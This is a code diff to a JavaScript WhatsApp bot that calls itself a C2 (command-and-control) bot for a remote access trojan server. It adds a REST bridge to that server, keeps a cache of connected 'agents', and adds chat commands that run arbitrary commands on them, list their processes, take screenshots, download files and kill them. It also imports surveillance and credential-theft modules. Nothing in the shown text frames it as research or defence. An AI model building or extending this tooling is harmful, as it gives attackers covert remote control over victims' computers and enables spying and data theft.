@@ -10,11 +10,14 @@ import chalk from 'chalk';
 import fs from 'fs';
 import { ResponseFormatter } from './utils/formatter.js';
 import { RATClient } from './utils/ratClient.js';
+import { APIBridgeClient } from './utils/apiBridgeClient.js';
+import { APICommandHandlers } from './utils/apiCommandHandlers.js';
 import { HelpHandler } from './utils/helpHandler.js';
 import { SurveillanceCommands } from './commands/surveillance.js';
 import { CredentialCommands } from './commands/credentials.js';
 import { SystemCommands } from './commands/system.js';
 import { FunCommands } from './commands/fun.js';
+import { ConfigLoader } from './utils/configLoader.js';
 
 /**
  * T0OL-B4S3-263 WhatsApp C2 Bot
@@ -23,12 +26,15 @@ import { FunCommands } from './commands/fun.js';
 
 class WhatsAppC2Bot {
   constructor() {
-    this.config = this.loadConfig();
+    this.yamlConfig = new ConfigLoader();  // Load from umbrella_config.yaml
+    this.config = this.loadConfig();        // Merge with local config.json
     this.sock = null;
     this.ratClient = null;
+    this.apiBridge = null;                  // REST API bridge for Python server
     this.currentSession = null;
     this.commandPrefix = this.config.whatsapp.prefix;
     this.ownerNumbers = this.config.whatsapp.ownerNumbers;
+    this.agents = {};                       // Cache of connected agents
     
     // Command modules will be initialized after socket connection
     this.surveillanceCmd = new SurveillanceCommands(null, null);
@@ -38,12 +44,27 @@ class WhatsAppC2Bot {
   }
 
   /**
-   * Load configuration with validation
+   * Load configuration - prefer umbrella_config.yaml, fallback to config.json
    */
   loadConfig() {
     try {
       const configData = fs.readFileSync('./config.json', 'utf8');
       const config = JSON.parse(configData);
+      
+      // Override with umbrella_config.yaml values if available
+      if (this.yamlConfig.config) {
+        config.ratServer = {
+          host: this.yamlConfig.get('server.listen_ip', '0.0.0.0'),
+          port: this.yamlConfig.get('server.listen_port', 4444),
+          apiPort: this.yamlConfig.get('server.api_port', 5000),
+          encryptionKey: this.yamlConfig.get('agent.encryption_key', config.ratServer?.encryptionKey)
+        };
+        
+        // Update bot config from YAML
+        if (this.yamlConfig.get('bot.whatsapp.bot_owners')) {
+          config.whatsapp.ownerNumbers = this.yamlConfig.get('bot.whatsapp.bot_owners', config.whatsapp.ownerNumbers);
+        }
+      }
       
       // Validate required fields
       this.validateConfig(config);
@@ -81,26 +102,56 @@ class WhatsAppC2Bot {
   }
 
   /**
-   * Initialize RAT client connection
+   * Initialize API Bridge and RAT client connection
    */
   async initRATClient() {
     try {
-      const host = this.config.ratServer.host || '127.0.0.1';
-      const port = this.config.ratServer.port || 4444;
-      const key = this.config.ratServer.encryptionKey || 'YOUR_ENCRYPTION_KEY_HERE';
+      // Initialize REST API bridge to Python server
+      this.apiBridge = new APIBridgeClient();
       
-      this.ratClient = new RATClient(host, port, key);
+      // Check Python server health
+      const health = await this.apiBridge.health();
       
-      // Establish connection to C2 server
-      await this.ratClient.connect();
-      
-      // Test connection status
-      const status = await this.ratClient.checkStatus();
-      
-      ResponseFormatter.log('success', `RAT C2 Server connected at ${host}:${port} (${status.active_sessions} active sessions)`);
+      if (health.status === 'healthy') {
+        ResponseFormatter.log('success', `Python RAT Server connected via REST API`);
+        
+        // Load connected agents
+        await this.syncAgents();
+        
+        // Keep legacy RATClient for backward compatibility
+        const host = this.config.ratServer.host || '127.0.0.1';
+        const port = this.config.ratServer.port || 4444;
+        const key = this.config.ratServer.encryptionKey || 'YOUR_ENCRYPTION_KEY_HERE';
+        this.ratClient = new RATClient(host, port, key);
+        
+        try {
+          await this.ratClient.connect();
+        } catch (e) {
+          ResponseFormatter.log('warning', 'Legacy RAT connection optional when using API bridge');
+        }
+      } else {
+        throw new Error(`Server unhealthy: ${health.message}`);
+      }
     } catch (error) {
-      ResponseFormatter.log('error', `RAT C2 Server connection failed: ${error.message}`);
+      ResponseFormatter.log('error', `RAT Server connection failed: ${error.message}`);
       ResponseFormatter.log('warning', 'Bot will continue, but RAT commands may fail');
+    }
+  }
+
+  /**
+   * Sync agents from server
+   */
+  async syncAgents() {
+    try {
+      const response = await this.apiBridge.listAgents();
+      if (response.agents && Array.isArray(response.agents)) {
+        response.agents.forEach(agent => {
+          this.agents[agent.id] = agent;
+        });
+        ResponseFormatter.log('success', `Synced ${response.agents.length} agents`);
+      }
+    } catch (error) {
+      ResponseFormatter.log('warning', `Failed to sync agents: ${error.message}`);
     }
   }
 
@@ -112,8 +163,9 @@ class WhatsAppC2Bot {
     this.credentialCmd = new CredentialCommands(this.ratClient, this.sock);
     this.systemCmd = new SystemCommands(this.ratClient, this.sock);
     this.funCmd = new FunCommands(this.ratClient, this.sock);
+    this.apiCmd = new APICommandHandlers(this.apiBridge, this.sock);
     
-    ResponseFormatter.log('success', 'Command modules initialized');
+    ResponseFormatter.log('success', 'Command modules initialized (including REST API bridge)');
   }
 
   /**
@@ -206,7 +258,55 @@ class WhatsAppC2Bot {
           await this.cmdPing(chatId);
           break;
 
-        // ========== SESSION MANAGEMENT ==========
+        // ========== AGENT MANAGEMENT (REST API) ==========
+        case 'agents':
+        case 'list':
+          await this.apiCmd.listAgents(chatId);
+          break;
+
+        case 'info':
+          await this.apiCmd.getAgentInfo(chatId, args[0]);
+          break;
+
+        case 'stats':
+        case 'server':
+          await this.apiCmd.getServerStats(chatId);
+          break;
+
+        case 'alerts':
+          await this.apiCmd.getAlerts(chatId);
+          break;
+
+        // ========== COMMAND EXECUTION (REST API) ==========
+        case 'exec':
+        case 'cmd':
+          await this.apiCmd.executeCommand(chatId, args[0], args.slice(1).join(' '));
+          break;
+
+        case 'sysinfo':
+          await this.apiCmd.getSystemInfo(chatId, args[0]);
+          break;
+
+        case 'processes':
+        case 'ps':
+          await this.apiCmd.getProcessList(chatId, args[0]);
+          break;
+
+        case 'screenshot':
+        case 'ss':
+          await this.apiCmd.getScreenshot(chatId, args[0]);
+          break;
+
+        case 'download':
+        case 'dl':
+          await this.apiCmd.getFile(chatId, args[0], args[1]);
+          break;
+
+        case 'killagent':
+          await this.apiCmd.killAgent(chatId, args[0]);
+          break;
+
+        // ========== LEGACY SESSION MANAGEMENT ==========
         case 'sessions':
           await this.cmdSessions(chatId);
           break;
@@ -222,10 +322,6 @@ class WhatsAppC2Bot {
         case 'kill':
           await this.cmdKillSession(chatId, args);
           break;
-
-        // ========== SYSTEM INFO ==========
-        case 'sysinfo':
-          await this.systemCmd.sysinfo(chatId, this.currentSession);
           break;
 
         case 'processes':
